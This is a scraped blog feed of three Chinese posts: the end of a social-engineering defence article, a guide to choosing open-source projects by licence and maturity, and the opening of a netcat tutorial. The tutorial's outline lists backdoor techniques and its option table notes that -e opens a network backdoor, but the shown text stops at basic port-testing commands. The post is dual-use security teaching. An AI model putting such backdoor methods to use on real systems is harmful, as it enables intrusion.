如果你是某公司/某机构里的一个小头目或大头目、甚至老板，那就得多看看这一节；否则的话，直接跳过本节，看下一个章节（个人该如何做）。</p><h3 id="◇普及教育"><a href="#◇普及教育" class="headerlink" title="◇普及教育"></a>◇普及教育</h3><p>　　最要紧的一条就是普及教育了。否则俺也不会在电脑前吭哧吭哧打这么多字，写这么个系列了。一些常识性的基础培训是很重要滴。按照二八原理，20%的简单培训就可以防范80%的潜在攻击。由于“<strong>人</strong>”是社会工程攻击的主要对象，并且有经验的攻击者都善于寻找组织机构的弱点，所以普及教育务必要涵盖到每一个人（连公司的扫地阿姨也不要放过哦**:-**）。<br>　　另外要强调的一点是：要重视对新员工的培训。很多时候，新员工往往是攻击者的突破点。首先，新员工初来乍到，跟周围的同事不熟，容易把攻击者误认为同事；其次，新员工往往怕得罪人，容易答应攻击者的各种要求。</p><h3 id="◇严格的认证"><a href="#◇严格的认证" class="headerlink" title="◇严格的认证"></a>◇严格的认证</h3><p>　　认证（Authentication）是一个信息安全的常用术语。通俗地说，认证就是解决<strong>某人到底是谁</strong>？<br>　　由于大部分的攻击者都会用到“身份冒充”这个步骤，所以认证就显得非常必要。只要进行一些简单的身份确认，就能够识破大多数假冒者。比如碰到公司内不认识的人找你索要敏感资料，你可以把电话打回去进行确认（最好是打回公司内部的座机）。</p><h3 id="◇严格的授权"><a href="#◇严格的授权" class="headerlink" title="◇严格的授权"></a>◇严格的授权</h3><p>　　授权（Authorization）和认证一样，也是一个常用的信息安全术语。通俗地说，授权就是解决<strong>某人到底能干啥</strong>？<br>　　对于组织机构来说，授权要尽量细化、尽量最小化。<br>　　举个例子。如果某软件公司中，<strong>所有的</strong>程序员都可以访问<strong>所有的</strong>源代码，那源代码泄漏的风险就很大。只要有一个人出问题，攻击者就可以得逞。反之，如果每个人只能访问自己开发的那部分代码，那安全风险就会小很多。即使某人上当受骗，也只会泄漏部分代码。</p><h3 id="◇信息分类"><a href="#◇信息分类" class="headerlink" title="◇信息分类"></a>◇信息分类</h3><p>　　在组织机构中，最好要有信息分类的制度。根据信息的重要程度，定出若干级别。越是机密的信息，知道的人越少。<br>　　比如在我负责的团队中，源代码的敏感度高于软件安装包。因此，源代码服务器只有开发人员能够访问；而放置安装包的发布服务器，大部分人（比如测试人员、产品人员）都可以访问。</p><h3 id="◇别乱丢办公垃圾"><a href="#◇别乱丢办公垃圾" class="headerlink" title="◇别乱丢办公垃圾"></a>◇别乱丢办公垃圾</h3><p>　　看完信息收集，大伙儿应该明白，乱扔垃圾可不光是砸到花花草草的问题，更危险的是给垃圾分析者提供了大量有价值的素材。这也就是为啥要给扫地阿姨培训社会工程学的道理。</p><h3 id="◇文化"><a href="#◇文化" class="headerlink" title="◇文化"></a>◇文化</h3><p>　　最后再来说一下企业文化对社会工程攻击的影响。<br>　　在前文，俺已经介绍了“通过权威来施加压力”的攻击手法。如果某个组织机构的等级很森严，就容易给攻击者留下利用的机会。还有一些组织机构，里面的人员都是好好先生，每个角落都是一团和气。这种机构和等级森严的组织一样，容易被攻击者利用。<br>　　所以，假如你碰巧是组织机构内部的一个实权人物，或许可以尝试改变一下现状。不过俺要提醒一句，一个组织机构（尤其是政府机构）的文化是很难轻易改变滴。所以，别对这个招数报太大希望 :-(</p><h2 id="★个人该如何做？"><a href="#★个人该如何做？" class="headerlink" title="★个人该如何做？"></a>★个人该如何做？</h2><p>　　前面介绍了企业内部的防范措施，接着就该说说个人该如何应对了。</p><h3 id="◇多了解一些社会工程学的手法"><a href="#◇多了解一些社会工程学的手法" class="headerlink" title="◇多了解一些社会工程学的手法"></a>◇多了解一些社会工程学的手法</h3><p>　　俗话说：知己知彼，百战不殆。如果你不想被人坑蒙拐骗，那就得多了解一些坑蒙拐骗的招数。除了俺提到过好几次的《<a href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》（<a href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著），你还可以通过互联网找到很多类似的资料。这些资料有助于你了解各种新出现的社会工程的手法。<br>　　另外，很多文学作品、影视节目也会掺杂社会工程学的情节。比如前段时间热播的《潜伏》，里面的主人公余则成显然是一个社会工程学老手。细心的同学应该能从中窥探到不少奥妙。</p><h3 id="◇保持理性"><a href="#◇保持理性" class="headerlink" title="◇保持理性"></a>◇保持理性</h3><p>　　在<strong>如何施加影响</strong>里，俺已经列举了很多种手法。这些手法不外乎都是利用人【<strong>感性</strong>】的弱点，然后施加影响。所以，尽量保持理性的思维（尤其在和陌生人沟通时）有助于减少你被攻击者忽悠的概率。不过捏，保持理性，<strong>说起来简单，做起来未必简单</strong> :-( 以后俺有空再来聊聊这方面的话题。</p><h3 id="◇保持冷静"><a href="#◇保持冷静" class="headerlink" title="◇保持冷静"></a>◇保持冷静</h3><p>　　还有一些“社会工程学”的惯用伎俩是【制造恐慌】。大部分人在慌乱之中就容易入套。<br>　　所以，保持冷静也很重要。不过捏，还是刚才那句话——<strong>说起来简单，做起来未必简单</strong>。</p><h3 id="◇保持一颗怀疑的心"><a href="#◇保持一颗怀疑的心" class="headerlink" title="◇保持一颗怀疑的心"></a>◇保持一颗怀疑的心</h3><p>　　这年头，除了骗子是真的，啥都可能是假的。比如，你收到的邮件，发件人地址是很容易伪造滴；比如，你公司座机上看到的来电显示，也可以被伪造；比如，你收到的手机短信，发短信的号码也可以伪造。<br>　　所以，保持一颗怀疑的心，也是非常必要的啊！</p><h3 id="◇别乱丢生活垃圾"><a href="#◇别乱丢生活垃圾" class="headerlink" title="◇别乱丢生活垃圾 :)"></a>◇别乱丢生活垃圾 :)</h3><p>　　不光上述提到的办公垃圾有潜在风险，生活垃圾一样也会被垃圾分析者利用。比如有些粗心的同学会把帐单、发票、取款机凭条等东西随意丢在垃圾桶中。一旦碰上有经验的垃圾分析者，你没准就麻烦了。</p><h3 id="◇（其它）"><a href="#◇（其它）" class="headerlink" title="◇（其它）"></a>◇（其它）</h3><p>　　肯定还有俺没提及的防范措施，欢迎大伙儿（到博客评论区）补充。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何选择开源项目？</title>
      <link href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%EF%BC%9F/"/>
      <url>/2021/07/17/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="如何选择开源项目？"><a href="#如何选择开源项目？" class="headerlink" title="如何选择开源项目？"></a>如何选择开源项目？</h1><p><strong>文章目录</strong></p><p>★License（授权协议、许可证）<br>★技术层面的因素<br>★普及程度（用户的人气）<br>★活跃程度（开发的人气）<br>★其它的风险</p><p>　　近几年开源项目越发普及，很多商业软件都逐渐引入开源项目。由于俺负责的产品线采用了不少开源项目（主要是 C++、Java、Python），这几年就经常会碰到开源项目选型的问题（从几个具有类似功能的开源软件项目中进行抉择）。今天我就大概聊一下自己的几点看法，供大伙儿参考。</p><h2 id="★License（授权协议、许可证）"><a href="#★License（授权协议、许可证）" class="headerlink" title="★License（授权协议、许可证）"></a>★License（授权协议、许可证）</h2><p>　　License 是很多人容易忽略的一个问题，所以我们先来聊一下 License 的问题。因为公司里面开发的软件大都属于商业软件（更严谨的叫法是“专属闭源软件”），根据开源协议和商业的冲突程度，可以分为三种：非常友好、不太友好、很敌对。下面分别介绍一下：</p><h3 id="◇对商业闭源软件“很敌对”的协议"><a href="#◇对商业闭源软件“很敌对”的协议" class="headerlink" title="◇对商业闭源软件“很敌对”的协议"></a>◇对商业闭源软件“很敌对”的协议</h3><p>　　先说说“很敌对”的协议：GPL（详细解释请看“<a href="https://en.wikipedia.org/wiki/GNU_General_Public_License">这里</a>”）。GPL 和闭源软件是有严重冲突的。通俗地说，如果某个软件使用了基于 GPL 协议的【动态库或静态库】，则【整个软件】必须也用 GPL 协议发布（这就是大名鼎鼎的【GPL 传染性】）。也就是说——如果你开发的是【闭源】软件，一旦发现自己想用的某个开源库属于 GPL 协议，即使功能再强再好用，也只好忍痛割爱了。<br>　　在此郑重提醒大伙儿，【切莫】抱侥幸心理，偷偷使用。一旦被雪亮的群众眼睛所发现，不光害了自己的名节，公司的名节也不保。</p><h3 id="◇对商业闭源软件“不太友好”的协议"><a href="#◇对商业闭源软件“不太友好”的协议" class="headerlink" title="◇对商业闭源软件“不太友好”的协议"></a>◇对商业闭源软件“不太友好”的协议</h3><p>　　因为 GPL 对于商业闭源软件太不友好了，估计当年很多开源库的作者怨声载道。GNU 组织为了缓和一下矛盾，搞出了一个折衷的 LGPL 协议（详细解释看“<a href="https://en.wikipedia.org/wiki/GNU_Lesser_General_Public_License">这里</a>”）。这个协议相对 GPL 来说，宽松了一些：商业闭源软件在【不公开】代码的前提下，可以在产品中使用 LGPL 的开源库。所以 LGPL 属于商业“不太友好”的协议。</p><h3 id="◇对商业闭源软件“很友好”的协议"><a href="#◇对商业闭源软件“很友好”的协议" class="headerlink" title="◇对商业闭源软件“很友好”的协议"></a>◇对商业闭源软件“很友好”的协议</h3><p>　　最后来说一下“非常友好”的协议，比较出名的有这几种：<a href="https://en.wikipedia.org/wiki/BSD_license">BSD</a>、<a href="https://en.wikipedia.org/wiki/Mozilla_Public_License">MPL（Mozilla）</a>、<a href="https://en.wikipedia.org/wiki/Apache_License">Apache</a>、<a href="https://en.wikipedia.org/wiki/MIT_License">MIT</a>。这些协议不但允许项目的使用者使用开源库，有些还允许对开源库进行修改并重新分发。因此用起来特别爽。上述这几个协议在细节上有些小差异，大伙儿可以去它们官网瞧一下。<br>　　另外，有些开源软件使用公共域授权（Public Domain，详细解释看“<a href="https://en.wikipedia.org/wiki/Public_domain">这里</a>”）。简单说，就是不作任何限制，软件的使用者可以为所欲为 :)</p><h3 id="◇其它协议"><a href="#◇其它协议" class="headerlink" title="◇其它协议"></a>◇其它协议</h3><p>　　上面提到的几种协议都是知名协议。还有少数开源项目不是采用知名协议，而是自己搞了一套协议。如果你碰到这种情况，就得硬着头皮认真读一遍协议上的洋文，看看它对于使用者有些什么限制了。</p><h2 id="★技术层面的因素"><a href="#★技术层面的因素" class="headerlink" title="★技术层面的因素"></a>★技术层面的因素</h2><p>　　由于技术层面的考量和你所开发的软件密切相关，因此这方面的评判依据千差万别。我只能挑几个比较通用的说一下。<br>　　假如你开发的是跨平台的项目，那么你选择开源项目就得考虑它支持哪些平台（硬件平台、操作系统平台、数据库平台）。如果你需要支持的平台它不能支持，那就赶紧另找一个。<br>　　有时候编译器的支持也是考虑的指标之一。比如俺曾经实施一个 Java 项目，用户的环境是 JDK 1.4。那么有些用了 Java 1.5 新语法的开源库就不能使用。<br>　　假如你开发的软件是性能敏感的，那选型的时候就要测试一下几个候选项目的性能指标。<br>　　现在安全问题越来越严重。如果你比较在意安全性的话，还得顺便调查一下候选项目是否有安全问题（比如缓冲区溢出的 bug、比如跨站脚本注入等）。</p><h2 id="★普及程度（用户的人气）"><a href="#★普及程度（用户的人气）" class="headerlink" title="★普及程度（用户的人气）"></a>★普及程度（用户的人气）</h2><p>　　所谓的普及程度，就是看开源项目的用户占有率。当然大伙儿不是搞市场调查的，花钱请市场调查公司也不现实。简单的办法就是用搜索引擎大致搜一下，就能看出几个候选项目使用的广泛度了。<br>　　还有另外一个判断普及程度的方式，就是看某个开源项目是否被知名的软件或者公司采用。比如 Firefox（算是知名软件）采用 Sqlite 来存储页面缓存和 cookie，这至少可以从侧面反映出 Sqlite 项目的优秀程度。<br>　　对于若干个候选项目，显然要优先考虑普及度高的那个。因为某个项目普及度高，至少说明（但不绝对）它比较成熟、稳定、安全。而且用的人多了之后，相应的文档也会多一些，碰到问题也容易找到人咨询。</p><h2 id="★活跃程度（开发的人气）"><a href="#★活跃程度（开发的人气）" class="headerlink" title="★活跃程度（开发的人气）"></a>★活跃程度（开发的人气）</h2><p>　　这里说的“活跃”，是指开发层面而言。<br>　　一般来说，一个项目越活越，则新功能的推出越快，对提交 bug 的响应也越快。还有些项目，由于开发人员不再继续开发（可能开发人员厌倦了、可能开发人员太忙了），从而导致活跃度很低。<br>　　不过也有例外——有些项目由于已经非常完善了，因此反而活跃程度很低。俺印象中：最近几年 bzip2 就很少有更新，但它是非常优秀的压缩库。</p><h2 id="★其它的风险"><a href="#★其它的风险" class="headerlink" title="★其它的风险"></a>★其它的风险</h2><p>　　最后来说说一些其它的风险。一般来说，只有当前几个因素都差不多的时候，才会来考虑其它风险。</p><h3 id="◇“单点故障”的风险"><a href="#◇“单点故障”的风险" class="headerlink" title="◇“单点故障”的风险"></a>◇“单点故障”的风险</h3><p>　　很多项目过于依赖【个人英雄主义——光靠着一两个大牛完成整个项目。一旦大牛出现意外，必然导致整个项目受到严重影响。典型的例子就是 ReiserFS 文件系统的创始人 Hans Reiser。这位老兄由于谋杀妻子的罪名成立，被判入狱15年（对 IT 八卦有兴趣的同学可以看“<a href="https://en.wikipedia.org/wiki/Hans_Reiser">这里</a>”）。导致 ReiserFS 项目受到严重影响。<br>　　顺便说一下：<br>　　这类风险在开源界有个专门的术语叫“<a href="https://en.wikipedia.org/wiki/Bus_factor">Bus Factor</a>”，翻译成“巴士因子”或“卡车系数”。指的是——项目中有多少个关键人物【同时】出车祸，才会导致项目瘫痪。</p><h3 id="◇商业风险"><a href="#◇商业风险" class="headerlink" title="◇商业风险"></a>◇商业风险</h3><p>　　还有些开源项目被商业公司收购后，由于种种原因（商业、管理、政治等）导致该开源项目受到不利影响。比如上星期听说 Michael Widenius（MySQL 共同创始人）和 Marten Mickos（MySQL 前任 CEO）从 Sun 离职。再加上去年10月走掉了的 David Axmark（MySQL 共同创始人）。估计对 MySQL 的影响不小。</p><p>　　上述提到的几个考量指标，排在越前面的，权重越高。你在选型时需要综合考虑这几个因素。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcat</title>
      <link href="/2021/07/16/netcat/"/>
      <url>/2021/07/16/netcat/</url>
      
        <content type="html"><![CDATA[<h1 id="扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”"><a href="#扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”" class="headerlink" title="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”"></a>扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</h1><p><strong>文章目录</strong></p><p>★引子<br>★netcat 是个啥玩意儿？<br>★netcat 能干啥？<br>★nc 命令行简介<br>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达<br>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口<br>★招数3：（渗透测试）用 nc 玩“端口扫描”<br>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）<br>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）<br>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问<br>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）<br>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）<br>★招数9：（系统管理）用 nc 传输文件<br>★招数10：（系统管理）用 nc 远程备份整个磁盘<br>★招数11：（入侵手法）用 nc 开启【被动】连接型后门<br>★招数12：（入侵手法）用 nc 开启【主动】连接型后门<br>★附录：netcat 的【其它变种】</p><hr><h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。<br>　　由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。<br>　　今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 ……<br>　　此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">---------------------<br>|<span class="hljs-string">      /\_/\        </span>|<br>|<span class="hljs-string">     / 0 0 \       </span>|<br>|<span class="hljs-string">    ====v====      </span>|<br>|<span class="hljs-string">     \  W  /       </span>|<br>|<span class="hljs-string">     </span>|<span class="hljs-string">     </span>|<span class="hljs-string">     _ </span>|<br>|<span class="hljs-string">     / ___ \    /  </span>|<br>|<span class="hljs-string">    / /   \ \  </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   (((-----)))-&#x27;   </span>|<br>|<span class="hljs-string">    /              </span>|<br>|<span class="hljs-string">   (      ___      </span>|<br>|<span class="hljs-string">    \__.=</span>|<span class="hljs-string">___E     </span>|<br>|<span class="hljs-string">           /       </span>|<br>---------------------<br></code></pre></td></tr></table></figure><h2 id="★netcat-是个啥玩意儿？"><a href="#★netcat-是个啥玩意儿？" class="headerlink" title="★netcat 是个啥玩意儿？"></a>★netcat 是个啥玩意儿？</h2><p>　　netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【<strong>网络上的瑞士军刀</strong>】。<br>　　它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。</p><h2 id="★netcat-能干啥？"><a href="#★netcat-能干啥？" class="headerlink" title="★netcat 能干啥？"></a>★netcat 能干啥？</h2><h3 id="◇概述"><a href="#◇概述" class="headerlink" title="◇概述"></a>◇概述</h3><p>　　简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（这里所说的“传输层协议”指的是 OSI 模型中的第4层，主要是 TCP ＆ UDP）。</p><h3 id="◇nc-的变种"><a href="#◇nc-的变种" class="headerlink" title="◇nc 的变种"></a>◇nc 的变种</h3><p>　　由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。<br>　　由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：<strong>这篇教程的内容，主要基于 OpenBSD 社区的变种</strong>（也叫“OpenBSD netcat”或“netcat-openbsd”）<br>　　顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。<br>　　虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。<br>　　为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼【原始】的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。<br>　　另，<br>　　在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。</p><h2 id="★nc-命令行简介"><a href="#★nc-命令行简介" class="headerlink" title="★nc 命令行简介"></a>★nc 命令行简介</h2><p>　　要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。</p><h3 id="◇nc-命令行的常规形式"><a href="#◇nc-命令行的常规形式" class="headerlink" title="◇nc 命令行的常规形式"></a>◇nc 命令行的常规形式</h3><p>　　一般来说，nc 的命令行包括如下几个部分：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> 命令选项 主机 端口<br></code></pre></td></tr></table></figure><p><strong>命令选项</strong><br>　　这部分可能包含 0~N 个选项<br>　　（注：这部分最复杂，下一个小节单独聊）<br><strong>主机</strong><br>　　这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。<br><strong>端口</strong><br>　　这部分可能没有，可能是单个端口，可能是端口范围。<br>　　对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：<code>1-1024</code></p><h3 id="◇何为“命令行选项”？"><a href="#◇何为“命令行选项”？" class="headerlink" title="◇何为“命令行选项”？"></a>◇何为“命令行选项”？</h3><p>　　简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。<br>　　你要使用的选项都放在 <code>nc</code> 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。<br>　　举例：<br>　　在下面这个例子中，分别用到了三个选项（<code>l、p、v</code>），其中 <code>12345</code> 是选项 <code>p</code> 所带的【选项值】。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">12345</span> -v<br></code></pre></td></tr></table></figure><p>　　如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -h</span><br></code></pre></td></tr></table></figure><p>　　顺便说一下：在上述命令的输出中，如果第一行包含 <code>OpenBSD</code> 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。</p><h3 id="◇【常用的】命令行选项"><a href="#◇【常用的】命令行选项" class="headerlink" title="◇【常用的】命令行选项"></a>◇【常用的】命令行选项</h3><p>　　由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。</p><table><thead><tr><th>选项</th><th>是否有“选项值”</th><th>说明</th></tr></thead><tbody><tr><td>h</td><td>NO</td><td>输出 nc 的帮助</td></tr><tr><td>v</td><td>NO</td><td>在网络通讯时，显示详细的输出信息 注：建议新手多用该选项，出错时帮你诊断问题</td></tr><tr><td>n</td><td>NO</td><td>对命令行中的“主机”，【不】进行域名解析 注：如果“主机”是“点分格式”的 IP 地址，需要用该选项； 如果“主机”是“域名”形式，【不能】用该选项</td></tr><tr><td>p</td><td>YES</td><td>指定“端口号”</td></tr><tr><td>l</td><td>NO</td><td>开启“监听模式”，nc 作为【服务端】 注：如不加该选项，nc 默认作为客户端</td></tr><tr><td>u</td><td>NO</td><td>使用 UDP 协议 注：如不加该选项，默认是 TCP 协议</td></tr><tr><td>w</td><td>YES</td><td>设置连接的超时间隔（N 秒）</td></tr><tr><td>q</td><td>YES</td><td>让 nc 延时（N 秒）再退出</td></tr><tr><td>z</td><td>NO</td><td>开启“zero-I/O 模式” 注：该选项仅用于“端口扫描”，后面会聊到</td></tr><tr><td>k</td><td>NO</td><td>配合 <code>-l</code> 选项使用，可以重复接受客户端连接。 注：“原版 nc”的该选项用来开启“TCP keepalive” 这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr><tr><td>X</td><td>YES</td><td>指定代理的类型（具体用法，后面会聊到） 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr><tr><td>x</td><td>YES</td><td>以 <code>IP:port</code> 的格式指定代理的位置。 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr><tr><td>e</td><td>YES</td><td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】 注：通常用该选项开启一个网络后门 “OpenBSD 变种”基于安全考虑，已去掉该选项， 但还是能用间接的方式达到同样的效果 :)</td></tr></tbody></table><p>　　汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。</p><h3 id="◇命令行选项的【合写】形式"><a href="#◇命令行选项的【合写】形式" class="headerlink" title="◇命令行选项的【合写】形式"></a>◇命令行选项的【合写】形式</h3><p>　　有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。<br>　　还拿刚才俺举的例子，以下几种写法是【等价】滴。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">12345</span> -v<br><span class="hljs-attribute">nc</span> -l -v -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure><h3 id="◇如何强行终止-nc？"><a href="#◇如何强行终止-nc？" class="headerlink" title="◇如何强行终止 nc？"></a>◇如何强行终止 nc？</h3><p>　　一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。<br>　　对 nc，你同样可以这么干。</p><h2 id="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"><a href="#★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达" class="headerlink" title="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"></a>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2><h3 id="◇使用场景"><a href="#◇使用场景" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　经常有这种需求，要判断某个主机的监听端口是否能连上。<br>　　导致监听端口【无法】，通常有两种原因：<br>其一，这个监听端口根本就【没开启】；<br>其二，监听端口虽然开启，但是被防火墙阻拦了。<br>　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启<br>　　但对于第2个原因，<code>netstat</code> 就用不上了。这时候就可以用 nc 来帮你搞定。</p><h3 id="◇方法"><a href="#◇方法" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　用如下命令可以测试某个 IP 地址（<code>x.x.x.x</code>）上的某个监听端口（<code>xx</code>）是否开启。</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure><p>　　上述命令用到了如下几个选项：</p><p><strong>选项 <code>-v</code></strong><br>　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br>　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）</p><p><strong>选项 <code>-n</code></strong><br>　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br>　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p><h3 id="◇补充说明：超时设置"><a href="#◇补充说明：超时设置" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　在测试链接的时候，如果你【没】使用 <code>-w</code> 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br>　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“<code>-w</code> 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv -w <span class="hljs-number">3</span> <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure><h3 id="◇补充说明：UDP"><a href="#◇补充说明：UDP" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 <code>-u</code> 选项。</p><h2 id="★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口"><a href="#★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口"></a>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2><h3 id="◇使用场景-1"><a href="#◇使用场景-1" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br>　　现在换另一个场景：<br>　　假设你正在配置防火墙规则，禁止 TCP 的 <code>8080</code> 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br>　　更进一步说：如果当前【没有】任何软件开启 <code>8080</code> 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br>　　为了叙述方便，设想如下场景：<br>有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br>然后要判断“主机S”上的防火墙是否会拦截其它主机对 <code>8080</code> TCP 端口的连接。</p><h3 id="◇方法-1"><a href="#◇方法-1" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><strong>选项 